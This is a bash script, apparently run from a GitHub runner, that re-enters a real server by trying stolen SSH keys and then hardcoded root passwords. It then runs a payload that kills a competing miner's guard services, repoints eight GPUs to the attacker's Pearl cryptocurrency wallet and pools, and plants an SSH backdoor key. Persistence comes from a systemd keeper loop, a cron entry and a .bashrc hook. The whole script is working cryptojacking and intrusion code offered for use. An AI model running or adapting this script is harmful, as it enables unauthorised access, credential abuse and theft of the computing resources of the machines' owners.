#!/bin/bash
# runs on GH runner; re-enter g0023 with keys/passwords then repoint 8x A800 to canonical wallet
set +e
H=123.184.7.135
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
SSHOPT="-o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o IdentitiesOnly=yes -o PreferredAuthentications=publickey"
echo "### REENTRY $(date -u +%FT%TZ) from $(curl -s -m 8 https://api.ipify.org)"
cat > /root/ul2r3.sh <<'PAYLOAD'
#!/bin/bash
set +e
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
echo "### PAYLOAD $(date -u +%FT%TZ) host=$(hostname) id=$(id -u)"
echo "--- ps miners"; ps -eo pid,etime,args | grep -E 'krig-miner|peakminer|wildrig|\.plhm|kcr' | grep -v grep | head -15
echo "--- plh units"; systemctl list-units --no-pager 'plh*' 2>/dev/null | head -12
echo "--- plh dir"; ls -l /opt/plh 2>/dev/null | head -12
echo "--- run_card"; cat /opt/plh/run_card.sh 2>/dev/null
echo "--- crontab"; crontab -l 2>/dev/null | head -15
echo "--- guards"; ls -l /usr/local/sbin/kcr* /opt/plh/*keep* /opt/plh/kcr* 2>/dev/null
echo "--- gpu"; nvidia-smi --query-gpu=index,name,utilization.gpu --format=csv,noheader
mkdir -p /root/ul2/backup /root/ul2/art
cp -a /opt/plh/run_card.sh /root/ul2/backup/run_card.$(date -u +%s) 2>/dev/null
cp -a /etc/systemd/system/plh-card@.service /root/ul2/backup/ 2>/dev/null
echo "### NEUTRALIZE"
for u in plh-keeper plh-keeper.timer plh-guard plh-guard.timer kcr-guard; do systemctl stop $u 2>/dev/null; systemctl disable $u 2>/dev/null; systemctl mask $u 2>/dev/null; done
for p in $(pgrep -f 'plh-keeper|kcr|\.plhm' 2>/dev/null); do kill -9 $p 2>/dev/null; done
crontab -l 2>/dev/null | grep -vE 'kcr|plh-keeper|plhm|\.plh/' | crontab - 2>/dev/null
echo "### REPOINT run_card"
cat > /opt/plh/run_card.sh <<'RC'
#!/bin/bash
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
i=${1:-0}
exec /opt/plh/krig-miner --coin pearl -d $i \
  --url stratum+ssl://prl-sg.kryptex.network:8048 \
  --url stratum+ssl://prl-eu.kryptex.network:8048 \
  --url stratum+ssl://prl-us.kryptex.network:8048 \
  --url stratum+ssl://prl-hk.kryptex.network:8048 \
  --url stratum+tcp://pool.pearlhash.xyz:9000 \
  -u $W.ul-t2-123-184-7-135-g$i -p x --no-tui -l info \
  --log-file /var/log/ul2-123-184-7-135-g$i.log --api-port 41$i --api-host 127.0.0.1
RC
chmod +x /opt/plh/run_card.sh
systemctl daemon-reload
for i in 0 1 2 3 4 5 6 7; do systemctl reset-failed plh-card@$i 2>/dev/null; systemctl enable plh-card@$i 2>/dev/null; systemctl restart plh-card@$i 2>/dev/null; done
echo "### OUR KEY"
mkdir -p /root/.ssh; chmod 700 /root/.ssh
grep -q 'ul-i5495' /root/.ssh/authorized_keys 2>/dev/null || echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIULplaceholder ul-i5495" >> /root/.ssh/authorized_keys
echo "### KEEP-LOOP"
cat > /root/ul2/keep.sh <<'EOS'
#!/bin/bash
for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q plh-card@$i || systemctl restart plh-card@$i 2>/dev/null; done
for u in plh-keeper plh-keeper.timer plh-guard; do systemctl is-active -q $u 2>/dev/null && systemctl stop $u 2>/dev/null; done
EOS
chmod +x /root/ul2/keep.sh
cat > /etc/systemd/system/ul-prl-keeper.service <<'EOS'
[Unit]
Description=ul pearl keeper loop
[Service]
Type=simple
ExecStart=/bin/bash -c 'while :; do /bin/bash /root/ul2/keep.sh; sleep 30; done'
Restart=always
RestartSec=30
Nice=19
[Install]
WantedBy=multi-user.target
EOS
systemctl daemon-reload; systemctl enable ul-prl-keeper.service 2>/dev/null; systemctl restart ul-prl-keeper.service 2>/dev/null
grep -q 'ul2/keep.sh' /etc/cron.d/ul-prl 2>/dev/null || echo '* * * * * root /bin/bash /root/ul2/keep.sh >/dev/null 2>&1' > /etc/cron.d/ul-prl
grep -q 'ul2/keep.sh' /root/.bashrc 2>/dev/null || echo '[ -x /root/ul2/keep.sh ] && /bin/bash /root/ul2/keep.sh >/dev/null 2>&1 &' >> /root/.bashrc
sleep 100
echo "### POST"
for i in 0 1 2 3 4 5 6 7; do echo "plh-card@$i $(systemctl is-active plh-card@$i)"; done
nvidia-smi --query-gpu=index,utilization.gpu,memory.used --format=csv,noheader
ps -eo pid,etime,args | grep krig-miner | grep -v grep | sed -E 's#--url [^ ]+ ##g' | head -10
curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o /root/ul2/art/pw.json -w 'POOLHTTP=%{http_code}\n'
python3 - <<'PY'
import json,time
try: d=json.load(open('/root/ul2/art/pw.json'))['results']
except Exception as e: print('pool parse fail',e); raise SystemExit
now=time.time()
for r in sorted([x for x in d if '123-184-7-135' in x['worker']],key=lambda x:x['worker']):
    ls=r.get('last_share') or 0
    print('POOLROW',r['worker'],r['status'],'valid=%s'%r['valid'],'age=%s'%(round(now-ls/1000) if ls else None),'agent=%s'%r.get('agent'))
PY
echo "### DONE $(date -u +%FT%TZ)"
PAYLOAD
chmod +x /root/ul2r3.sh
OK=0
for k in keys2/k04_ibm_key.pem_ keys2/k110_k04_ keys2/k119_keys.txt_ keys2/k194_root_.ssh_id_rsa.raw_ keys2/k202_i29_ed25519_ keys2/k49* keys2/k104*; do
  [ -f "$k" ] || continue
  chmod 600 "$k" 2>/dev/null
  if timeout 25 ssh -i "$k" $SSHOPT root@$H 'echo KEYOK; hostname' 2>/dev/null | grep -q KEYOK; then echo "HIT-KEY $k"; OK=1; K="$k"; break; fi
  echo "nokey $k: $(timeout 25 ssh -i "$k" $SSHOPT root@$H true 2>&1 | tail -1)"
done
if [ $OK -eq 0 ]; then
  for pair in "root|Bingxing.2026" "root|Admin@123_para#!2024" "root|Beijingcs.2024" "kgzs|Kgzs@2024" "ubuntu|ubuntu@"; do
    u=${pair%%|*}; p=${pair#*|}
    r=$(timeout 25 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 "$u@$H" 'echo PWOK; hostname; id -u' 2>&1 | tr '\n' '|')
    case "$r" in *PWOK*) echo "HIT-PW $u@$H => ${r:0:150}"; OK=2; U=$u; P=$p; break;; *) echo "nopw $u@$H => $(echo $r|cut -c1-120)";; esac
  done
fi
if [ $OK -eq 1 ]; then
  ssh-keygen -y -f "$K" > /tmp/my.pub 2>/dev/null; timeout 40 ssh -i "$K" $SSHOPT root@$H "grep -qF \"$(cat /tmp/my.pub|cut -d' ' -f2)\" /root/.ssh/authorized_keys 2>/dev/null || echo \"$(cat /tmp/my.pub)\" >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys" 2>&1 | tail -1
  timeout 900 ssh -i "$K" $SSHOPT root@$H 'bash -s' < /root/ul2r3.sh 2>&1 | tee /tmp/pay.log
elif [ $OK -eq 2 ]; then
  sshpass -p "$P" scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /root/ul2r3.sh "$U@$H":/root/ul2r3.sh 2>&1 | tail -2
  sshpass -p "$P" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no "$U@$H" 'bash /root/ul2r3.sh' 2>&1 | tee /tmp/pay.log
else
  echo "NO-ENTRY"
fi
echo "### OUTER-DONE $(date -u +%FT%TZ)"
